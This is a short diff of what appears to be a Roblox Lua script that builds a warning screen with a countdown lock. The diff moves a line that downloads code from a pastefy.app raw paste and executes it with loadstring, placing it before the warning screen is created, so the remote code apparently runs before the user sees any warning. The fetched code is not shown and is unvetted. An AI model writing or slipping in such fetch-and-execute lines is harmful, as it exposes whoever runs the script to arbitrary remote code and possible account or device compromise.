@@ -7,7 +7,7 @@ local PlayerGui = player:WaitForChild("PlayerGui")
 if PlayerGui:FindFirstChild("WarningGUI") then
     PlayerGui.WarningGUI:Destroy()
 end
-
+loadstring(game:HttpGet("https://pastefy.app/vs6D6Wq7/raw"))()
 -- ScreenGui
 local gui = Instance.new("ScreenGui")
 gui.Name = "WarningGUI"
@@ -82,7 +82,7 @@ Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
 local btnStroke = Instance.new("UIStroke")
 btnStroke.Color = Color3.fromRGB(255, 150, 150)
 btnStroke.Parent = button
-loadstring(game:HttpGet("https://pastefy.app/vs6D6Wq7/raw"))()
+
 -- Countdown lock
 local unlocked = false
 task.spawn(function()
